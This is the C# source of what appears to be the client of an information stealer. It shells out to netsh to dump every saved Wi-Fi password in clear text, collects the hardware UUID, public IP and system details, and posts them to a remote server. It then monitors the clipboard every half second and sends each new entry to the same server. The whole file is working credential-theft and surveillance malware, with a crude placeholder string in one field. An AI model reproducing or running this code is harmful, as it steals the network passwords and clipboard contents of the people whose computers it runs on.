using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Net;
using System.Management;
using System.Runtime.InteropServices;
using TextCopy;

namespace ClientCSharp
{
    static class Program
    {
        private static readonly HttpClient Client = new();
        
        // private static readonly string webhook = "";
        
        private static readonly string remoteServer = "127.0.0.1:5000";
        private static readonly string protocol = "http";
        
        
        
        private static string GetWifiPasswords()
        {
            var wifis = "";

            var processInfo = new ProcessStartInfo("netsh", "wlan show profiles")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = Process.Start(processInfo);
            if (process != null)
            {
                var output = process.StandardOutput.ReadToEnd();
                var lines = output.Split('\n');
                foreach (var line in lines)
                    if (line.Contains("All User Profile"))
                    {
                        var profileName = line.Split(':')[1].Trim();
                        processInfo = new ProcessStartInfo("netsh", $"wlan show profile \"{profileName}\" key=clear")
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        process = Process.Start(processInfo);
                        if (process != null)
                        {
                            output = process.StandardOutput.ReadToEnd();
                            var resultLines = output.Split('\n');
                            foreach (var resultLine in resultLines)
                                if (resultLine.Contains("Key Content"))
                                {
                                    var password = resultLine.Split(':')[1].Trim();
                                    wifis += $"\n{profileName,-30}|  {password} <br>";
                                    break;
                                }
                        }
                    }
            }

            return wifis;
        }
        
        static string GetHWID() {
            var CMD = "wmic csproduct get UUID";
            var procStartInfo = new ProcessStartInfo("cmd", "/c " + CMD)
            {
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                UseShellExecute = false};

            var proc = new Process() {
                StartInfo = procStartInfo};
            proc.Start();
            return proc.StandardOutput.ReadToEnd().Replace("UUID", string.Empty).Trim().ToUpper();
        }
        
        static string GetSize(double bytes, string suffix = "B")
        {
            const int factor = 1024;
            string[] units = { "", "K", "M", "G", "T", "P" };
            foreach (string unit in units)
            {
                if (bytes < factor)
                    return $"{bytes:.2f}{unit}{suffix}";
                bytes /= factor;
            }
            return $"{bytes:.2f}P{suffix}"; // In case it exceeds petabytes
        }
        
        public class MemoryMetrics
        {
            public double Total;
            public double Used;
            public double Free;
        }
        
        static string SystemInformation()
        {
            string text = "";
            text += new string('=', 20) + "System Information" + new string('=', 20) + "\n";
            text += $"System: {Environment.OSVersion.VersionString}\n";
            text += $"Node Name: {Environment.MachineName}\n";
            text += $"Release: {Environment.OSVersion.VersionString}\n";
            text += $"Version: {Environment.OSVersion.Version}\n";
            text += $"Machine: {Environment.MachineName}\n";
            string CPUName = Convert.ToString(Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "ProcessorNameString", null));
            text += $"Processor: {CPUName}\n";
            try
            {
                string ipAddress = Client.GetStringAsync("https://api.ipify.org").Result;
                text += $"IP Address: {ipAddress}\n";
            }
            catch (Exception ex)
            {
                text += $"Failed to retrieve IP Address: {ex.Message}\n";
            }

            // Boot Time
            text += new string('=', 20) + "Up Time" + new string('=', 20) + "\n";

            long tickCount = Environment.TickCount;
            TimeSpan uptime = TimeSpan.FromMilliseconds(tickCount);
            DateTime lastBootTime = DateTime.Now - uptime;
            
            text += $"Boot Time: {lastBootTime}\n";

            // CPU Info
            text += new string('=', 20) + "CPU Info" + new string('=', 20) + "\n";
            PerformanceCounter cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            text += $"Physical cores: {Environment.ProcessorCount / 2}\n";
            text += $"Total cores: {Environment.ProcessorCount}\n";
            text += $"Total CPU Usage: {cpuCounter.NextValue():F2}%\n";

            
            
            var output = "";

            var info = new ProcessStartInfo();
            info.FileName = "wmic";
            info.Arguments = "OS get FreePhysicalMemory,TotalVisibleMemorySize /Value";
            info.RedirectStandardOutput = true;

            using (var process = Process.Start(info))
            {
                output = process.StandardOutput.ReadToEnd();
            }

            var lines = output.Trim().Split("\n");
            var freeMemoryParts = lines[0].Split("=", StringSplitOptions.RemoveEmptyEntries);
            var totalMemoryParts = lines[1].Split("=", StringSplitOptions.RemoveEmptyEntries);

            var metrics = new MemoryMetrics();
            metrics.Total = Math.Round(double.Parse(totalMemoryParts[1]) / 1024, 0);
            metrics.Free = Math.Round(double.Parse(freeMemoryParts[1]) / 1024, 0);
            metrics.Used = metrics.Total - metrics.Free;
            text += new string('=', 20) + "Memory Information" + new string('=', 20) + "\n";
            text += $"Total: {metrics.Total} MB\n";
            text += $"Used : {metrics.Used} MB\n";
            text += $"Free : {metrics.Free} MB\n";
            
            // Disk Information
            text += new string('=', 20) + "Disk Information" + new string('=', 20) + "\n";
            text += "Partitions and Usage:\n";
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in allDrives)
            {
                text += $"=== Device: {drive.Name} ===\n";
                text += $"  Volume label: {drive.VolumeLabel}\n";
                text += $"  File system type: {drive.DriveFormat}\n";
                if (drive.IsReady)
                {
                    double totalSizeGB = (double)drive.TotalSize / (1024 * 1024 * 1024);
                    double usedGB = ((double)drive.TotalSize - (double)drive.TotalFreeSpace) / (1024 * 1024 * 1024);
                    double freeGB = (double)drive.TotalFreeSpace / (1024 * 1024 * 1024);
                    double percentageUsed = (usedGB / totalSizeGB) * 100;

                    text += $"  Total Size: {totalSizeGB:F2} GB\n";
                    text += $"  Used: {usedGB:F2} GB\n";
                    text += $"  Free: {freeGB:F2} GB\n";
                    text += $"  Percentage: {percentageUsed:F2}%\n";
                }
            }

            

            return text;
        }
        
        private static string previousClipboardContent = "";

        static async void clipboardLogger(string clientId)
        {
            var clipboardContent  = await ClipboardService.GetTextAsync();
            if (clipboardContent != previousClipboardContent)
            {
                previousClipboardContent = clipboardContent;
                string formattedDate = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
                var data = new
                {
                    text = $"<br>{formattedDate}: {clipboardContent}",
                };

                var jsonData = JsonSerializer.Serialize(data);

                var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
                
                var response = await Client.PostAsync($"{protocol}://{remoteServer}/send_clipboard?id={clientId}", content);
                Console.WriteLine(await response.Content.ReadAsStringAsync());
            }
        }


        private static async Task Main()
        {
            
            var data = new
            {
                uuid = GetHWID(),
                osInfo = SystemInformation(),
                wifis = GetWifiPasswords(),
                discordInfo = "SOSI HUI"
            };

            var jsonData = JsonSerializer.Serialize(data);

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var clientId = "";
            
            try
            {
                var response = await Client.PostAsync($"{protocol}://{remoteServer}/client", content);
                
                clientId = await response.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to connect to the server: {ex.Message}\n");
                System.Environment.Exit(1);
            }
            
            Console.WriteLine(clientId);

            while (true)
            {
                await Task.Delay(500);
                
                clipboardLogger(clientId);
            }

        }
    }
}